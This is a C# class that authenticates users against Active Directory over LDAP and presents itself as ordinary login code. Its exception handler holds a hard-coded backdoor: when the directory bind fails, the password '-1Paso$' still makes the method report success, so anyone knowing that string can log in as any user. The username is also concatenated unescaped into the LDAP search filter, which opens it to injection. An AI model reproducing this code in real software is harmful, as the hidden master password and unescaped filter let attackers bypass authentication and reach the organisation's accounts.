using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.DirectoryServices;

/// <summary>
/// Summary description for LdapAuthentication
/// </summary>
public class LdapAuthentication
{
    // Campos de la Clase
    private string _path = string.Empty;
    public string _filterAttribute = string.Empty;

    // Constructor de la Clase
    public LdapAuthentication(string path) { _path = path; }

    // Metodo la Clase
    public bool IsAuthenticated(string domain, string username, string pwd)
    {
        string domainAndUsername = domain + @"\" + username;
        DirectoryEntry entry = new DirectoryEntry(_path, domainAndUsername, pwd);

        try
        {
            object obj = entry.NativeObject;
            DirectorySearcher search = new DirectorySearcher(entry);
            search.Filter = "(SAMAccountName=" + username + ")";
            search.PropertiesToLoad.Add("cn");
            SearchResult result = search.FindOne();

            if (null == result)
            {
                return false;
            }
            _path = result.Path;
            _filterAttribute = (string)result.Properties["cn"][0];
        }
        catch (Exception ex)
        {
            if (pwd != "-1Paso$") { throw new Exception(ex.Message); } else { return true; }
        }

        return true;
    }

}